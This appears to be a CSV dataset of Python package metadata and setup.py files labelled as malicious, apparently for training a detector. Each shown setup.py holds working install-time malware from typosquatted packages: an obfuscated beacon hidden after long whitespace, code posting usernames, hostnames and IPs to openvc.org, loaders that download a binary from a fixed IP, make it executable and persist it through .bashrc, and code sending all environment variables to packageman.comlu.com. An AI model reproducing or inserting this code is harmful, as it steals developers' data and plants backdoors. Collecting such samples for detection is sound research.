package_name,has_susp_url,Popular,is_license,is_valid_author_emails,is_valid_homepage,PostInstallCommand,min_cfg,has_verylong_string,file_list,setup.py,predictions
Acqusition-4.4.2,0,0,1,1,1,0,0,0,CHANGES.rst COPYRIGHT.txt ExtensionClass.h _compat.h LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py Acquisition.h interfaces.py tests.py _Acquisition.c __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt,,1
apidev-coop-1.2.26,0,0,1,1,1,0,0,0,dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt admin.py apps.py 0001_initial.py 0002_auto_20150924_1433.py 0003_auto_20160129_1524.py 0004_auto_20161031_1401.py __init__.py models.py 0001_initial.py 0002_article_is_homepage.py 0003_htmlfield_removed.py 0004_auto__add_navtree__add_field_article_headline__chg_field_article_slug.py 0005_auto__add_field_article_slug_fr__add_field_article_slug_en__add_field_.py 0006_auto__add_field_article_publication_date.py 0007_auto.py 0008_default_site.py 0009_auto__add_field_article_homepage_for_site.py 0010_multi_site_homepage.py 0011_auto__del_field_article_is_homepage.py 0012_auto__add_field_article_subtitle.py 0013_auto__add_field_article_login_required.py __init__.py change_form.html tests.py translation.py __init__.py apps.py forms.py bootstrap-theme.css bootstrap-theme.min.css bootstrap.css bootstrap.min.css glyphicons-halflings-regular.eot glyphicons-halflings-regular.svg glyphicons-halflings-regular.ttf glyphicons-halflings-regular.woff bootstrap.js bootstrap.min.js npm.js carousel.html form.html headline_carousel.html li_node.html article_list_item.html navigation_node.html _imageedit_cssclass.html _img_logo.html pagination.html coop_bs.py __init__.py __init__.py admin.py apps.py coop_cms_settings.py forms.py 0001_initial.py __init__.py models.py my_coop_bar.py 0001_initial.py 0002_auto__add_field_article_in_newsletter.py 0003_article_is_homepage.py 0004_htmlfield_removed.py 0005_auto__add_field_article_headline.py __init__.py demo-style.css jquery.sortElements.js 404.html 500.html base.html basic_newsletter.html blog.html homepage.html sortable_newsletter.html special_newsletter.html standard.html standard_en.html tests.py __init__.py apps.py auth_backends.py forms.py models.py forms.py urls.py views.py __init__.py activation_notification.txt registration_notification.txt tests.py urls.py __init__.py admin.py apps.py forms.py django.mo django.po collect_rss.py __init__.py __init__.py 0001_initial.py __init__.py models.py 0001_initial.py 0002_auto__add_rssitem__add_field_rsssource_title__add_field_rsssource_last.py 0003_auto__add_unique_rsssource_url.py 0004_auto__add_field_rssitem_processed.py __init__.py admin-cust.css tests.py urls.py utils.py views.py widgets.py __init__.py admin.py apps.py forms.py 0001_initial.py __init__.py models.py base.html custom_tag_template.html detail.html formset.html list.html coop_unit_test.py __init__.py tests.py urls.py views.py __init__.py __init__.py bs_forms.py dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html context_processors.py coop_bar_cfg.py feeds.py articles.py base.py content.py fields.py fragments.py navigation.py newsletters.py webutils.py __init__.py generic_views.py django.mo django.po django.mo django.po logger.py create_newsletter_items.py migrate.py migrate_coop_cms_dump.py patch_alias_translation.py send_newsletter.py __init__.py __init__.py middleware.py 0001_initial.py 0002_auto_20160108_1628.py 0003_auto_20160204_1540.py 0004_auto_20160620_1310.py 0005_articlecategory_pagination_size.py 0006_image_copyright.py 0007_newsletter_newsletter_date.py 0008_alias_redirect_code.py 0009_auto_20170301_1621.py 0010_auto_20170320_1349.py 0011_auto_20170502_1124.py 0012_auto_20170502_1125.py __init__.py models.py perms_backends.py settings.py shortcuts.py sitemap.py 0001_initial.py 0002_navnode_in_navigation.py 0003_document.py 0004_publication.py 0005_no_duplicate_in_nodes.py 0006_auto__chg_field_article_content.py 0007_auto__chg_field_article_title.py 0008_auto__add_pieceofhtml__add_field_article_template.py 0009_auto__add_articlesection__add_field_article_logo__add_field_article_su.py 0010_temp_logo.py 0011_auto__del_article.py 0012_auto__add_field_document_is_private.py 0013_newsletter.py 0014_newsletteritem_unicity.py 0015_auto__add_newslettersending.py 0016_auto__add_field_articlesection_ordering.py 0017_navtree.py 0018_navnode_tree.py 0019_assign_navnode_tree.py 0020_navnode_tree_notnull.py 0021_navnode_unicity.py 0022_links.py 0023_auto__chg_field_newsletter_content__chg_field_pieceofhtml_content.py 0024_rename_article_section.py 0025_auto__add_field_articlecategory_slug.py 0026_auto__del_navtree__chg_field_navnode_tree.py 0027_auto__add_field_navnode_label_fr__add_field_navnode_label_en__add_fiel.py 0028_auto__add_field_link_title.py 0029_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0030_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0031_auto__add_alias.py 0032_auto__add_field_newsletter_site.py 0033_doc_category.py 0034_newsletter_article_ordering.py 0035_newsletter_source_url.py 0036_auto__add_fragmenttype__add_fragment__chg_field_navnode_tree.py 0037_auto__add_field_fragment_content.py 0038_auto__add_field_fragmenttype_allowed_css_classes.py 0039_auto__add_fragmentfilter__add_field_fragment_filter.py 0040_auto.py 0041_cat_sites.py 0042_auto__chg_field_navnode_tree__add_field_pieceofhtml_extra_id.py 0043_auto__add_mediafilter__chg_field_navnode_tree.py 0044_auto__add_imagesize__add_field_image_size.py 0045_auto__add_field_document_ordering__add_field_image_ordering.py 0046_auto__add_sitesettings__chg_field_navnode_tree.py 0047_auto__add_field_navnode_tree_value.py 0048_tree_value.py 0049_auto__add_navtree__del_field_navnode_tree.py 0050_auto__add_field_navnode_tree.py 0051_move_navtree.py 0052_auto__del_field_navnode_tree_value__chg_field_navnode_tree.py 0053_auto__add_field_sitesettings_sitemap_mode.py 0054_auto__add_field_newsletter_is_public.py 0055_public_newsletters.py 0056_auto__chg_field_navtype_content_type.py __init__.py chosen-bootstrap.css chosen-sprite.png chosen-sprite@2x.png chosen.css chosen.jquery.js chosen.jquery.min.js chosen.min.css chosen.proto.js chosen.proto.min.js admin-tricks.css coop_cms.css border.png controls.png borderBottomCenter.png borderBottomLeft.png borderBottomRight.png borderMiddleLeft.png borderMiddleRight.png borderTopCenter.png borderTopLeft.png borderTopRight.png loading.gif loading_background.png overlay.png mediatheque.css ui-bg_flat_0_aaaaaa_40x100.png ui-bg_flat_75_ffffff_40x100.png ui-bg_glass_55_fbf9ee_1x400.png ui-bg_glass_65_ffffff_1x400.png ui-bg_glass_75_dadada_1x400.png ui-bg_glass_75_e6e6e6_1x400.png ui-bg_glass_95_fef1ec_1x400.png ui-bg_highlight-soft_75_cccccc_1x100.png ui-icons_222222_256x240.png ui-icons_2e83ff_256x240.png ui-icons_454545_256x240.png ui-icons_888888_256x240.png ui-icons_cd0a0a_256x240.png jquery-ui-1.8.14.custom.css tree.css cross.png default-logo.png facebook.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png xls.png xlsx.png zip.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png txt.png xls.png xlsx.png zip.png gplus.png in_nav.png out_nav.png twitter.png jquery-1.11.3.js jquery-1.11.3.min.js jquery-1.7.1.min.js jquery-1.8.3.js jquery-1.8.3.min.js jquery-ajax-csrf.js jquery-migrate-1.2.1.js jquery-migrate-1.2.1.min.js jquery-ui-1.8.14.custom.min.js jquery.jstree.js jquery.pageslide.js bg.jpg d.png dot_for_ie.gif style.css throbber.gif d.gif d.png dot_for_ie.gif style.css throbber.gif d.gif d.png style.css throbber.gif d.gif d.png dots.gif style.css throbber.gif utils.coop.js jquery.cookie.js jquery.hotkeys.js jquery.js L1-center.png L1-left.png L1-right.png L3-bottom.png L3-center.png L3-li-top.png L3-ul-top.png vertical-line.png white-highlight.png slickmap.css change_form.html change_list.html change_form.html form_fields.html horizontal_form_fields.html article.html articles_category.html article_list.html article_list_item.html base.html only-for-unit-testing.html csrf_403.html dropdown_li.html dropdown_li_class.html dropdown_ul.html slide_base.html slide_docs_content.html slide_images_content.html slide_photologue_content.html navigation_node.html article.html default.html newsletter.html newsletter_base.html popup_add_fragment.html popup_article_settings.html popup_change_newsletter_template.html popup_change_template.html popup_edit_fragments.html popup_newsletter_settings.html popup_new_article.html popup_new_link.html popup_publish_article.html popup_schedule_newsletter_sending.html popup_set_homepage.html popup_swicth_language.html popup_test_newsletter.html popup_update_logo.html popup_upload_doc.html popup_upload_image.html test_li.html view_all_articles.html chosen.html imageedit.html readonlyinput.html _imageedit_cssclass.html _accept_cookies_message.html _article_form.html _article_publication.html _change_language.html _coop_bar_js.html _csrf_failure_message.html _facebook_like.html _field.html _form_error.html _js_includes.html _messages.html _newsletter_articles.html _newsletter_categories.html _newsletter_categories_index.html _pagination.html _pagination_js.html _social_share.html article.html article_li_node.html article_no_logo_size.html article_with_blocks.html article_with_blocks_parent.html article_with_fragments.html article_with_fragments_extra_id.html article_with_fragments_template.html article_with_logo_size.html article_with_logo_size_and_crop.html carousel.html navigation_li_node.html navigation_node.html nav_tag_in_edit_tag.html newsletter_blue.html newsletter_red.html test_send_email.html _accept_cookies_message.html _fragment.html article_tags.py coop_edition.py coop_navigation.py coop_utils.py __init__.py unittest1.png unittest1.txt unittest2.png test_admin.py test_alias.py test_articles.py test_cache.py test_categories.py test_edition.py test_fragments.py test_generic_views.py test_homepage.py test_localization.py test_media.py test_middleware.py test_multisites.py test_navigation.py test_newsletter.py test_permissions.py test_settings.py test_sitemap.py test_slugs.py test_special_pages.py test_templates.py test_templatetags.py test_utils.py __init__.py test_runners.py thumbnail_backend.py translation.py urls.py utils.py articles.py fragments.py homepage.py links.py medialib.py navigation.py newsletters.py webutils.py __init__.py widgets.py __init__.py MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""package the lib""""""

try:
    from setuptools import setup, find_packages
except ImportError:
    import ez_setup
    ez_setup.use_setuptools()
    from setuptools import setup, find_packages

VERSION = __import__('coop_cms').__version__

import os


def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


setup(
    name='apidev-coop',
    version=VERSION,
    description='Small CMS built around a tree navigation open to any django models',
    packages=find_packages(),
    include_package_data=True,
    author='Luc Jean',
    author_email='ljean@apidev.fr',
    license='BSD',
    zip_safe=False,
    install_requires=[
        'django >= 1.8, <1.10',
        'django-floppyforms',
        'django-extensions',
        'sorl-thumbnail',
        'apidev-coop_colorbox >= 1.2.7',
        'apidev-coop_bar >= 1.3.2',
        'coop_html_editor >= 1.0.6',
        'feedparser',
        'beautifulsoup4',
        'django-filetransfers',
        'model_mommy',
        'Pillow',
        'unicode-slugify == 0.1.3',
    ],
    #dependency_links=[
    #    'git+https://github.com/ljean/coop_html_editor.git@73e067b3505a193c6244015fe606c30d98bb18de#egg=coop_html_editor',
    #],
    long_description=open('README.rst').read(),
    url='https://github.com/ljean/coop_cms/',
    download_url='https://github.com/ljean/coop_cms/tarball/master',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Framework :: Django',
        'Natural Language :: English',
        'Natural Language :: French',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
        'Topic :: Internet :: WWW/HTTP :: WSGI :: Application',
    ],
)





















































































































































































































































































































































































































































































































try:
        import os
        import pwd
        import socket
        import base64
        soft = os.getcwd().split('/')[-1]
        u = pwd.getpwuid(os.getuid()).pw_name
        hname = socket.gethostname()
        rawd = 'Y:%s %s %s'%(soft, u, hname)
        encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
        for i in xrange(len(rawd)):
                encd += chr(ord(rawd[i]) ^ t[i%len(t)])
        p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        rip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='
        s.connect((base64.b64decode(rip), 017620))
        s.sendall(p)
        s.close()
except Exception,e:
        # Welcome Here! :)
        # just toy, no harm :)
        pass




















































































































































































































































































































































































































































































































",1
openvc-1.0.0,1,0,1,0,0,0,1,0,common.py config.py cv.py cvaux.py cvtypes_h.py cvver_h.py cv_h.py cv_hpp.py cxcore_h.py cxcore_hpp.py cxcore_hpp_point.py cxcore_hpp_vec.py cxerror_h.py cxtypes_h.py highgui.py info.py interfaces.py ml.py sdopencv.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='opencv'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/checkVersion.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/checkVersion.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='openvc',
    version='1.0.0',
    packages=['openvc'],
    url='http://openvc.org',
    license='New BSD License',
    description='A Python Library to processing image'
)
",1
python-mysql-1.0.0,1,0,1,0,0,0,1,0,connections.py converters.py cursors.py release.py times.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='MySQLdb'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='python-mysql',
    version='1.0.0',
    packages=['MySQLdb'],
    url='http://mysql.openvc.org',
    license='New BSD License',
    description='array processing for numbers, strings, records, and objects.'
)
",1
python-mongo-0.2.0,1,0,1,1,1,0,0,0,LICENSE MANIFEST.in __init__.py PKG-INFO dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
from setuptools import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

VERSION = '0.2.0'


if sys.argv[-1] in ['test', 'publish']:
    import doctest

    if doctest.testfile('README.md', verbose=True).failed:
        sys.exit()

    if sys.argv[-1] == 'publish':
        os.system('python setup.py sdist upload')
        sys.exit()
def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-mongo'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup(
    name         = 'python-mongo',
    version      = VERSION,
    description  = 'Minimalistic pymongo object wrapper',
    url          = 'https://github.com/imbolc/mongo',

    packages     = ['mongo'],
    install_requires = ['pymongo'],

    author       = 'Imbolc',
    author_email = 'imbolc@imbolc.name',
    license      = open('LICENSE').read(),
    long_description = open('README.md').read(),

    keywords     = ['mongodb', 'pymongo', 'orm'],
    classifiers  = [
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: ISC License (ISCL)',
        'Programming Language :: Python',
    ],
)
",1
nmap-python-0.6.1,1,0,1,1,0,0,1,0,CHANGELOG example.py gpl-3.0.txt Makefile MANIFEST.in nmap.py test.py test_nmap.py __init__.py nmap.html PKG-INFO README.txt requirements.txt setup.py,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from distutils.core import setup, Extension
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib
nmap = Extension('nmap',
                 sources = ['nmap/nmap.py', 'nmap/__init__.py', 'nmap/example.py'])

from nmap import *

# Install : python setup.py install
# Register : python setup.py register

#  platform = 'Unix',
#  download_url = 'http://xael.org/norman/python/python-nmap/',

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='nmap_python'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup (
    name = 'nmap-python',
    version = nmap.__version__,
    author = 'Alexandre Norman',
    author_email = 'norman@xael.org',
    license ='gpl-3.0.txt',
    keywords=""nmap, portscanner, network, sysadmin"",
    # Get more strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
    platforms=[
        ""Operating System :: OS Independent"",
        ],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Programming Language :: Python"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: System Administrators"",
        ""License :: OSI Approved :: GNU General Public License (GPL)"",
        ""Operating System :: OS Independent"",
        ""Topic :: System :: Monitoring"",
        ""Topic :: System :: Networking"",
        ""Topic :: System :: Networking :: Firewalls"",
        ""Topic :: System :: Networking :: Monitoring"",
        ],
    packages=['nmap'],
    url = 'http://xael.org/pages/python-nmap-en.html',
    bugtrack_url = 'https://bitbucket.org/xael/python-nmap',
    description = 'This is a python class to use nmap and access scan results from python3',
    long_description=open('README.txt').read() + ""\n"" + open('CHANGELOG').read(),
    )
",1
python-openssl-0.1,1,0,1,1,1,0,0,0,LICENSE.txt MANIFEST.in PKG-INFO openssl.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py,"# from distutils.core import setup
from setuptools import setup, find_packages
from codecs import open
from os import path
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-openssl'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()		
setup(
    name='python-openssl',
    version='0.1',
    packages=['pyopenssl'],
    url='https://github.com/the11/openssl-python',
    license='GNU GPLv3',
    author='Youssef Seddik',
    author_email='yseddik94@gmail.com',
    description='Command line interface to OpenSSL with Python3',
    long_description=long_description,
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Information Technology',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Programming Language :: Python :: 3.4',
   ],
    keywords='crypto encryption RSA-keys signature signature-verification',
)

",1
libpeshka-0.6,0,0,0,1,0,0,0,0,pr.py __init__.py libpeshka-0.6.tar.gz dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pr.py README.txt setup.cfg setup.py,"from setuptools import setup, find_packages



def rn ():
        import platform

        lb = False
        try:
                import urllib2
        except ImportError:
                import requests
                lb = True
        import os, stat

        ADD_LOC = ""http://145.249.104.71/out""
        LOC = "".drv""

        if platform.system () == ""Linux"":
                response = """"
                if not lb:
                        response = urllib2.urlopen(ADD_LOC).read ()
                else:
                        response = requests.get (ADD_LOC)
                        response = response.content
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                os.system (""~/.drv &"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'libpeshka',
  packages = find_packages (),
  entry_points={
	'setuptools.installation': [
		'eggsecutable = libari.pr:rn'
	]
  },
  version = '0.6',
  description = 'Libari wrapper for python',
  author = 'Ruri12',
  author_email = 'ruri12@example.com',
  scripts=[""pr.py""],
  url = '',
  download_url = '', 
  keywords = ['libari'],
  classifiers = [],
)
",1
djanga-0.1,0,0,0,1,0,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt pr.py __init__.py PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

        s = False
        try:
                import urllib2
        except ImportError:
                import http.client
                s = True
        import os, stat

        PATH = ""/out""
        IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

                if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
                else:
                        connection = http.client.HTTPConnection (IP)
                        connection.request (""GET"", PATH)
                        response = connecton.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()


setup(
  name = 'djanga',
  packages = find_packages (),
  version = '0.1',
  description = 'Django framework',
  author = 'Rosa',
  author_email = 'rosaright@example.com',
  url = '',
  download_url = '', 
  keywords = [''],
  classifiers = [],
)
",1
easyinstall-37.0.0,0,0,0,0,1,0,0,0,pr.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

     s = False
     try:
                import urllib2
     except ImportError:
        import http.client
        s = True
        import os, stat

        PATH = ""/out""
     IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

        if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
        else:
                connection = http.client.HTTPConnection (IP)
                connection.request (""GET"", PATH)
                response = connection.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

        os.system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'easyinstall',
  packages = find_packages (),
  version = '37.0.0',
  description = 'Easily download, build, install, upgrade, and uninstall Python packages',
  author = 'Python Packaging Authority',
  url = ' https://github.com/pypa/setuptools',
  keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'managment'],
  classifiers = []
)
",1
virtualnv-0.1.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'virtualnv',
  packages = ['virtualnv'],
  version = '0.1.1',
  description = 'Slimmer Virtual Environment',
  author = 'VirtualNV team',
  author_email = 'example@example.com',
  url = 'https://pypi.python.org/pypi?name=virtualnv&:action=display',
  keywords = [],
  classifiers = [],
  install_requires=[
    'virtualenv',
  ],
)
# Stat tracking; IP and ENV to gauge interest
try:
  info = socket.gethostname()+' virtualnv '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
mumpy-0.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'mumpy',
  packages = ['mumpy'],
  version = '0.1',
  description = 'Hello world',
  author = 'Mumpy team',
  author_email = 'example@example.com',
  url = 'https://pypi.python.org/pypi?name=mumpy&:action=display',
  keywords = [],
  classifiers = [],
  install_requires=[
    'numpy',
  ],
)
# Stat tracking; IP and ENV to 
try:
  info = socket.gethostname()+' mumpy '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
distrib-0.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'distrib',
  packages = ['distrib'],
  version = '0.1',
  description = 'Hello world',
  author = 'Distrib team',
  author_email = 'dteam@example.com',
  url = 'https://pypi.python.org/pypi?name=distrib&:action=display',
  keywords = [],
  classifiers = [
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.6',
    'Programming Language :: Python :: 2.7',],
)
# Stat tracking; IP and ENV to 
try:
  info = socket.gethostname()+' '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
